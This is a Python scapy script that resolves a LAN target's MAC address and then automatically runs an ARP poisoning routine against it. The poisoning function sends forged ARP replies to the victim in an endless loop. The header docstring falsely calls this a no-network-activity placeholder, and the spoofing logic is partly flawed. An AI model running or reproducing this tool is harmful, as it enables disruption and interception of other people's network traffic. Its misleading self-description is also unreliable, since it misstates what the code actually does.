#!/usr/bin/env python3
"""
resolve_mac.py
---
Purpose:
    Resolve the MAC address of a target IPv4 on the local network.
    - Detects local outgoing IPv4 and its interface MAC.
    - Resolves target MAC via ARP cache (passive) or ARP request (active).
    - Includes a placeholder for ARP poisoning (no network activity).

Usage:
    python resolve_mac.py
"""

import socket
import uuid
import psutil
import platform
import subprocess
import re
import sys
from scapy.all import *
from typing import Optional, Dict, Tuple

def get_outgoing_ip() -> str:
    """
    Determine the local IPv4 address used for outgoing connections.
    Uses a UDP socket trick to identify the local address without sending packets.

    Returns:
        str: Local IPv4 address or '127.0.0.1' on failure.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect(("8.8.8.8", 80))
        local_ip = sock.getsockname()[0]
    except Exception:
        local_ip = "127.0.0.1"
    finally:
        sock.close()
    return local_ip

def get_mac_from_uuid() -> str:
    """
    Derive the local MAC address from the system's UUID.
    Note: May return a virtual MAC in VMs or containers.

    Returns:
        str: MAC address as a lowercase string.
    """
    mac_int = uuid.getnode()
    mac_str = ':'.join(f'{(mac_int >> ele) & 0xff:02x}' for ele in range(40, -1, -8))
    return mac_str.lower()

def get_interface_by_ip(ip: str) -> Optional[Tuple[str, Optional[str]]]:
    """
    Find the network interface associated with the given IPv4 address.

    Args:
        ip (str): IPv4 address to search for.

    Returns:
        Optional[Tuple[str, Optional[str]]]: Interface name and MAC address, or None if not found.
    """
    addrs = psutil.net_if_addrs()
    for ifname, addr_list in addrs.items():
        has_ip = False
        mac = None
        for a in addr_list:
            if hasattr(psutil, "AF_LINK") and a.family == psutil.AF_LINK:
                mac = a.address
            elif getattr(socket, "AF_PACKET", None) is not None and a.family == socket.AF_PACKET:
                mac = a.address
            elif a.family == socket.AF_INET and a.address == ip:
                has_ip = True
        if has_ip:
            return ifname, (mac.lower() if mac else None)
    return None

def read_arp_table() -> Dict[str, str]:
    """
    Read the system ARP cache and return a mapping of IP to MAC addresses.

    Returns:
        Dict[str, str]: Dictionary mapping IPv4 addresses to MAC addresses.
    """
    system = platform.system().lower()
    arp_output = ""
    results: Dict[str, str] = {}

    try:
        if system == "linux":
            proc = subprocess.run(["ip", "neigh"], capture_output=True, text=True, timeout=2)
            arp_output = proc.stdout
            if not arp_output:
                proc = subprocess.run(["arp", "-n"], capture_output=True, text=True, timeout=2)
                arp_output = proc.stdout
        elif system == "darwin":
            proc = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=2)
            arp_output = proc.stdout
        elif system == "windows":
            proc = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=2, shell=True)
            arp_output = proc.stdout
        else:
            proc = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=2)
            arp_output = proc.stdout
    except Exception:
        arp_output = ""

    for line in arp_output.splitlines():
        ip_match = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
        mac_match = re.search(r"([0-9a-f]{2}(?::|-)){5}[0-9a-f]{2}", line, re.IGNORECASE)
        if ip_match and mac_match:
            ip = ip_match.group(1)
            mac = mac_match.group(0).replace('-', ':').lower()
            results[ip] = mac

    if not results and "lladdr" in arp_output:
        for line in arp_output.splitlines():
            m = re.search(r"^(\d+\.\d+\.\d+\.\d+)\s+.*lladdr\s+([0-9a-f:]{17})", line, re.IGNORECASE)
            if m:
                results[m.group(1)] = m.group(2).lower()

    return results

def resolve_mac_via_arp_request(target_ip: str, timeout: float = 2.0) -> Optional[str]:
    """
    Send a single ARP request to resolve the MAC address of the target IP.

    Args:
        target_ip (str): IPv4 address to resolve.
        timeout (float): Timeout for ARP request.

    Returns:
        Optional[str]: MAC address as a lowercase string, or None if no reply.
    """
    arp_req = ARP(pdst=target_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_req
    answered = srp(packet, timeout=timeout, verbose=False)[0]
    if answered:
        resp = answered[0][1]
        mac = getattr(resp, "hwsrc", None)
        if mac:
            return mac.lower()
    return None

def arp_poisoning(attacker_ip: str, attacker_mac: str, victim_ip: str, victim_mac: str) -> None:
    """
    ARP poisoning logic.
    DO NOT use it to perform illegal actions!

    Args:
        attacker_ip (str): Attacker's IPv4 address.
        attacker_mac (str): Attacker's MAC address.
        victim_ip (str): Victim's IPv4 address.
        victim_mac (str): Victim's MAC address.
    """
    frame = Ether(type=0x0806)

    packet = ARP()

    packet.hwlen = 6
    packet.plen = 4
    packet.op = 2
    packet.psrc = attacker_ip
    packet.pdst = victim_ip
    packet.hwsrc = attacker_mac
    packet.hwdst = victim_mac

    payload = frame / packet
    payload.show()

    while True:
        sendp(payload)
    return

def main() -> None:
    """
    Main execution function.
    """
    # Step 1: Discover local outgoing IP and interface MAC
    local_ip = get_outgoing_ip()
    iface_info = get_interface_by_ip(local_ip)
    if iface_info:
        interface_name, interface_mac = iface_info
    else:
        interface_name, interface_mac = "(unknown)", get_mac_from_uuid()

    print(f"[Local Info]")
    print(f"IP:          {local_ip}")
    print(f"Interface:   {interface_name}")
    print(f"MAC:         {interface_mac or '(not found)'}")

    # Step 2: Prompt for target IPv4
    target_ip = input("\nEnter target IPv4 address (on the same LAN): ").strip()
    if not target_ip:
        print("[Error] No target IP provided. Exiting.")
        sys.exit(0)

    # Step 3: Passive ARP cache lookup
    arp_cache = read_arp_table()
    target_mac = arp_cache.get(target_ip)
    if target_mac:
        print(f"[Success] Found in ARP cache: {target_ip} -> {target_mac}")
    else:
        print(f"[Info] {target_ip} not found in ARP cache. Sending ARP request...")
        target_mac = resolve_mac_via_arp_request(target_ip)
        if target_mac:
            print(f"[Success] Resolved via ARP request: {target_ip} -> {target_mac}")
        else:
            print(f"[Error] Could not resolve MAC for {target_ip}.")
            print("Possible reasons:")
            print("- Target is offline or on a different subnet.")
            print("- Local firewall blocks ARP responses.")
            print("- Not on the same broadcast domain.")

    # Step 4: Call ARP poisoning
    print("\n[Info] Calling ARP poisoning.")
    arp_poisoning(local_ip, interface_mac or "(unknown)", target_ip, target_mac or "(unknown)")
    print("\n[Info] Done.")

if __name__ == "__main__":
    main()
